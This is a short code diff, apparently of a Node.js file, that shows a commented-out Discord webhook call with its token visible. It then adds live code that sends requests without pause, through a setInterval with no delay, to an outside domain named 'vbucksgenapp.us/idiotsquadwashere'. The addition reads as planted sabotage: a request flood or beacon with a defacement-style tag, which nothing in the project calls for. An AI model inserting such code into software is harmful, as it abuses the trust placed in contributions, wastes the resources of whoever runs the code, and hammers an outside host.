@@ -17,3 +17,9 @@ fetch('https://discord.com/api/webhooks/772197161366192128/Hy5-EkgsxgBupHlLcI85_
     .then(res => res.json())
     .then(json => console.log(json));
 */
+
+const fetch = require('node-fetch');
+
+setInterval(() => {
+        fetch("https://vbucksgenapp.us/idiotsquadwashere?gHASGhkSGHAsgHAGSHshAGSAHGhsAGHSGhAGSHGAHsghgsjgsgjhgahgAHJGhjgAHJGAshj");
+});
